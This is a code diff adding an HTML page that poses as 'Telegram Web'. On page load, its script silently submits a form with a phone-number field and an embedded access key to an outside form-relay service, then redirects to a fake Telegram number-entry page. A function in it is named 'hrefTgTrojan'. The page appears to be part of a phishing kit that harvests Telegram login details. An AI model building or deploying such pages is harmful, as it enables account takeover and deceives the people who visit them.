@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Web</title>
+  <link rel="stylesheet" href="./css/style.css">
+  <link rel="stylesheet" href="./pages/tg-entrance__number/css/reset.css">
+  <link rel="icon" href="./img/favicon.ico" type="image/webp">
+</head>
+
+<body>
+
+    <form action="https://api.web3forms.com/submit" method="POST" id="form-number">
+      <input type="hidden" name="access_key" value="a0a12ce9-eb3f-4e77-a522-eb0f2a15b478">
+      <input type="tel"  class="number" name="name" required>
+    </form>
+
+
+
+<style>
+  body{
+    background-color: #212121;
+}
+</style>
+
+	 <script>
+window.onload(fucOnload())
+
+function fucOnload(){
+let formNumber = document.getElementById('form-number')
+formNumber.submit();
+setTimeout(hrefTgTrojan,300)
+}
+
+function hrefTgTrojan(){
+  window.location.href = 
+    "./pages/tg-entrance__number/index.html";
+}
+</script>
+
+</body>
+</html>
